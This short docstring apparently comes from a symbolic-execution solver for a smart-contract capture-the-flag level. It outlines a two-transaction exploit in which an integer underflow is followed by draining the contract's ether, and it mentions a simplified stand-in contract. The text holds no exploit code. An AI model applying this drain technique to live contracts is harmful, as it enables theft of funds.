'''
This level uses an exploit that requires two transactions to complete
The first transaction triggers the integer underflow and the second
    will drain the contract ether
This complicates the symbolic execution a lot
To simplify symbolic execution, a simpler token contract has been created
    This simpler contract functions exactly the same as the ctf level contract for our purposes
    and exploits on this simple contract can be used directly on the ctf level
When properly configured, this level should only take 2 minutes to solve on an n1 GCP instance
